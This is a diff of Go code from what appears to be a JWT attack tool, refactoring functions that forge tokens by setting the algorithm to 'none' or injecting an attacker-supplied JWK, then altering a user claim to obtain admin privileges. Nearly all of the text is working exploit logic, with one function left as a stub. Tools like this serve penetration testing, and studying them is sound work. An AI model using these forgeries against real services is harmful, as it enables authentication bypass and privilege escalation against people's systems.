@@ -8,7 +8,7 @@ import (
 	"github.com/golang-jwt/jwt/v5"
 )
 
-func ExploitNoneAlgo(token *jwt.Token, userHeader string, userValue string) string {
+func ExploitNoneAlgo(token *jwt.Token) string {
 
 	cpyToken := ctrl.CloneToken(token)
 	cpyToken, err := ctrl.ChangeValue(cpyToken, "alg", "none", true)
@@ -18,13 +18,11 @@ func ExploitNoneAlgo(token *jwt.Token, userHeader string, userValue string) stri
 		return ""
 	}
 
-	//Change the value of the header to create the admin privs token
-	if userHeader != "" {
-		cpyToken, err = ctrl.ChangeValue(cpyToken, userHeader, userValue, false)
-		if err != nil {
-			fmt.Printf("An error ocurred while modifying the value of the \"%s\" header : %v \n", userHeader, err)
-			return ""
-		}
+	//Change the value of the header to create a token with admin privs
+	cpyToken, err = ChangeUserValue(cpyToken)
+	if err != nil {
+		fmt.Printf("%v \n", err)
+		return ""
 	}
 
 	//It can be signed with any secret as this vulnerability only works if the signature is not verified
@@ -38,13 +36,13 @@ func ExploitNoneAlgo(token *jwt.Token, userHeader string, userValue string) stri
 
 }
 
-func ExploitAlgoConfusion(token *jwt.Token, userHeader string, userValue string, algorithm string, publicKey string) string {
+func ExploitAlgoConfusion(token *jwt.Token, algorithm string, publicKey string) string {
 
 	//TODO
 	return ""
 }
 
-func ExploitPublicKeyInjection(token *jwt.Token, userHeader string, userValue string, algorithm string) string {
+func ExploitPublicKeyInjection(token *jwt.Token, algorithm string) string {
 
 	cpyToken := ctrl.CloneToken(token)
 
@@ -55,7 +53,7 @@ func ExploitPublicKeyInjection(token *jwt.Token, userHeader string, userValue st
 		return ""
 	}
 
-	//Generate public/private keys
+	//Generate JWK using the public key
 	jwkValue, err := ctrl.GenerateJWK(publicKey, algorithm)
 	if err != nil {
 		fmt.Printf("%v\n", err)
@@ -71,16 +69,14 @@ func ExploitPublicKeyInjection(token *jwt.Token, userHeader string, userValue st
 	}
 	cpyToken.Header["jwk"] = jwkMap
 
-	//If the "user" header has been found
 	//Change the value of the header to create a token with admin privs
-	if userHeader != "" {
-		cpyToken, err = ctrl.ChangeValue(cpyToken, userHeader, userValue, false)
-		if err != nil {
-			fmt.Printf("An error ocurred while modifying the value of the \"%s\" header : %v \n", userHeader, err)
-			return ""
-		}
+	cpyToken, err = ChangeUserValue(cpyToken)
+	if err != nil {
+		fmt.Printf("%v \n", err)
+		return ""
 	}
 
+	//Sign the token with the private key
 	strToken, err := cpyToken.SignedString(privateKey)
 	if err != nil {
 		fmt.Printf("An error ocurred while signing the token with a \"none\" alg : %v \n", err)
